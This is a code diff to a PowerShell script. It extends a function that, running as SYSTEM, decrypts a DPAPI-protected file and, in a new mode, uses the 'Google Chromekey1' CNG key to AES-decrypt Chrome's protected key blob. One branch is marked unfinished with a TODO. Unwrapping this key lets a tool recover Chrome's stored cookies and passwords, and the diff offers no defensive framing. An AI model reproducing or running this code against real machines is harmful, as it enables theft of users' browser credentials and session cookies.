@@ -632,17 +632,47 @@ function Invoke-CommandAs {
 
 function Invoke-WcunlockB {
     Param(
+    $Mode,
     $InputFile,
     $OutputFile
     )
-
-    $Script = {
-        $SourceData = Get-Content -Path "$($args[0])" -Encoding Byte -Raw
-        Add-Type -AssemblyName System.Security
-        $Unprotected = [Security.Cryptography.ProtectedData]::Unprotect($SourceData, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-        Set-Content -Path "$($args[1])" -Encoding Byte -Value $Unprotected
+    switch ($Mode) {
+        "a" {
+            $Script = {
+                $SourceData = Get-Content -Path "$($args[0])" -Encoding Byte -Raw
+                Add-Type -AssemblyName System.Security
+                $Unprotected = [Security.Cryptography.ProtectedData]::Unprotect($SourceData, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+                Set-Content -Path "$($args[1])" -Encoding Byte -Value $Unprotected
+            }
+            Invoke-CommandAs -ScriptBlock $Script -ArgumentList $InputFile,$OutputFile -AsSystem
+        }
+        "b" {
+            $Script = {
+                Add-Type -AssemblyName System.Security
+                $Key = [Security.Cryptography.CngKey]::Open("Google Chromekey1", [Security.Cryptography.CngProvider]::MicrosoftSoftwareKeyStorageProvider, 0)
+                if (-Not [Security.Cryptography.CngKey]::Exists("Google Chromekey1", [Security.Cryptography.CngProvider]::MicrosoftSoftwareKeyStorageProvider)) {
+                  exit
+                }
+                $SourceData = Get-Content -Path "$($args[0])" -Encoding Byte -Raw
+                switch ($Key.Algorithm.Algorithm) {
+                    "AES" {
+                        $Aes = New-Object Security.Cryptography.AesCng("Google Chromekey1", [Security.Cryptography.CngProvider]::MicrosoftSoftwareKeyStorageProvider, 0)
+                        $Aes.IV = [byte[]]::new(16)
+                        $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+                        $Decryptor = $Aes.CreateDecryptor()
+                        $Stream = New-Object System.IO.MemoryStream
+                        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($Stream, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+                        $CryptoStream.Write($SourceData, 0, $SourceData.Length)
+                        $CryptoStream.Flush()
+                        Set-Content -Path "$($args[1])" -Encoding Byte -Value $Stream.ToArray()
+                        # TODO implement
+                    }
+                }
+            }
+            Invoke-CommandAs -ScriptBlock $Script -ArgumentList $InputFile,$OutputFile -AsSystem
+        }
     }
-    Invoke-CommandAs -ScriptBlock $Script -ArgumentList $InputFile,$OutputFile -AsSystem
 }
 
 Invoke-WcunlockB `
